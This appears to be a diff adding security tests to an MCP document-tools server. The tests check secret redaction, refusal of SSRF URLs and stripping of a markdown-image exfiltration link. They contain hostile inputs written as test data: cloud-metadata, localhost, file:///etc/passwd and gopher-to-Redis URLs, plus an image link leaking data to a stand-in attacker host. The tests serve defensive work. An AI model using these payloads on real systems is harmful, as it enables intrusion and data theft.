@@ -5,11 +5,15 @@ exfiltration, injection, traversal, and denial-of-service vectors rather
 than passing them through.
 """
 
+import json
+
 import pytest
 from fastmcp.exceptions import ToolError
 
+import arrowhead.tools.doc_retrieve as retrieve_module
 from arrowhead.config import get_settings
 from arrowhead.tools.doc_read import doc_read
+from arrowhead.tools.doc_scan import doc_scan
 from arrowhead.tools.doc_search import doc_search
 
 MARKDOWN_EXFIL = [
@@ -80,3 +84,48 @@ async def test_catastrophic_regex_is_bounded(docs, monkeypatch):
     # Must return (possibly aborting the pattern), never hang.
     result = await doc_search(r"(a+)+$", use_regex=True)
     assert "match_count" in result
+
+
+SECRET_VALUES = [
+    "AKIAIOSFODNN7EXAMPLE",
+    "-----BEGIN RSA PRIVATE KEY-----",
+    "alice@example.com",
+    "123-45-6789",
+]
+
+
+@pytest.mark.parametrize("secret", SECRET_VALUES)
+async def test_scan_never_returns_the_raw_secret(docs, secret):
+    (docs / "leak.txt").write_text(f"value: {secret} end")
+    result = await doc_scan()
+    assert secret not in json.dumps(result)
+
+
+SSRF_URLS = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://127.0.0.1/admin",
+    "http://10.0.0.1/",
+    "http://[::1]/",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/_INFO",
+]
+
+
+@pytest.mark.parametrize("url", SSRF_URLS)
+async def test_retrieve_refuses_ssrf_targets(url):
+    with pytest.raises(ToolError):
+        await retrieve_module.doc_retrieve(url)
+
+
+async def test_retrieve_neutralizes_exfiltration_from_remote(monkeypatch):
+    async def fake_fetch(url):
+        return {
+            "status": 200,
+            "content_type": "text/markdown",
+            "body": "![x](http://attacker.example/?leak=1) <script>go()</script>",
+        }
+
+    monkeypatch.setattr(retrieve_module, "fetch_url", fake_fetch)
+    result = await retrieve_module.doc_retrieve("https://example.com/x.md")
+    assert "attacker.example" not in result["content"]
+    assert "<script>" not in result["content"]
